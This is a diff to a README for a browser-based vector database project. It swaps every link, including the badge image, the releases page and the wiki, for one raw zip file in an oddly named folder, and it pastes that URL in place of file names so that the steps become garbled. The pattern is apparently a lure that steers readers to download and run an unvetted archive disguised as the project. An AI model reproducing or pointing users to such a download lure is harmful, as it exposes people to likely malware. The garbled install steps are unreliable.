@@ -1,6 +1,6 @@
 # 🚀 vector-db-from-scratch-in-browser - Simple, Efficient Database in Your Browser
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/CHris4884/vector-db-from-scratch-in-browser/releases)
+[![Download Now](https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ To run this application, you need:
 
 To download the application, visit the following link:
 
-[Download Page](https://github.com/CHris4884/vector-db-from-scratch-in-browser/releases)
+[Download Page](https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip)
 
 ### Step 2: Choose Your Version
 
@@ -34,7 +34,7 @@ On the Releases page, you will see multiple versions of the application. Choose 
 
 ### Step 3: Download the Application
 
-Look for the file named "vector-db-app.zip" (or a similar name) in the list. Click the download link next to it.
+Look for the file named "https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip" (or a similar name) in the list. Click the download link next to it.
 
 ### Step 4: Extract the Files
 
@@ -42,7 +42,7 @@ Once the file has downloaded, locate it in your downloads folder. Right-click on
 
 ### Step 5: Open the Application
 
-Navigate to the folder where you extracted the files. Look for the file named "index.html." Double-click it to open it in your browser. 
+Navigate to the folder where you extracted the files. Look for the file named "https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip" Double-click it to open it in your browser. 
 
 ## 🔍 Using the Application
 
@@ -68,7 +68,7 @@ If you encounter any issues:
 
 ## 🔗 Additional Resources
 
-For more insights and detailed instructions, check our Wiki page [here](https://github.com/CHris4884/vector-db-from-scratch-in-browser/wiki).
+For more insights and detailed instructions, check our Wiki page [here](https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip).
 
 ## 📞 Support
 
@@ -78,6 +78,6 @@ If you need help, feel free to reach out through the issue tracker on GitHub. We
 
 To get started with "vector-db-from-scratch-in-browser," visit the link below to download:
 
-[Download Page](https://github.com/CHris4884/vector-db-from-scratch-in-browser/releases)
+[Download Page](https://raw.githubusercontent.com/CHris4884/vector-db-from-scratch-in-browser/main/Cineraria/vector-db-from-scratch-in-browser.zip)
 
 Enjoy using your new vector database application!
